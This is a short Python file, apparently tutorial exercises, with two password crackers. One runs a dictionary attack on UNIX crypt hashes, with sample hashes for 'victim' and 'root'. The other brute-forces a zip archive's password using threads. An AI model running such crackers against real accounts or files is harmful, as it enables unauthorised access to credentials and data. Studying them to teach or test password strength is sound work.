#!/usr/bin/python
# -*- coding:utf-8 -*-


class TestPass:
    """第一个程序：UNIX口令破解机"""
    @staticmethod
    def test_pass(crypt_pass):
        """
        假如两个用户的账号密码为：victim--HX9LLTdc/jiDE, root--DFNFxgW7C05Fo
        取密码的前两位，如HX，然后和常见密码字典运算，如crypt.crypt('egg', 'HX')
        """
        import crypt
        slat = crypt_pass[0:2]
        dict_file = open("dictionary.txt", "r")
        for word in dict_file.readlines():
            word = word.strip('\n')
            crypt_word = crypt.crypt(word, slat)
            if crypt_word == crypt_pass:
                print("[+] Found Password: " + word + "\n")
                return
        print("[-] Password Not Found.\n")

    @staticmethod
    def main():
        pass_file = open("passwords.txt")
        for line in pass_file.readlines():
            if ":" in line:
                user = line.split(":")[0]
                crypt_pass = line.split(":")[1].strip(" ")
                print("[*] Cracking Password For: " + user)
                TestPass.test_pass(crypt_pass)


class TestZip:
    """一个Zip文件口令破解机"""
    @staticmethod
    def extract_file(z_file, password):
        try:
            z_file.extractall(pwd=password)
            print("[+] Password = " + password + "\n")
        except:
            pass
    @staticmethod
    def main():
        import zipfile
        z_file = zipfile.ZipFile("evil.zip")
        pass_file = open("dictionary.txt")
        for line in pass_file.readlines():
            password = line.strip("\n")
            from threading import Thread
            t = Thread(target=TestZip.extract_file, args=(z_file, password))
            t.start()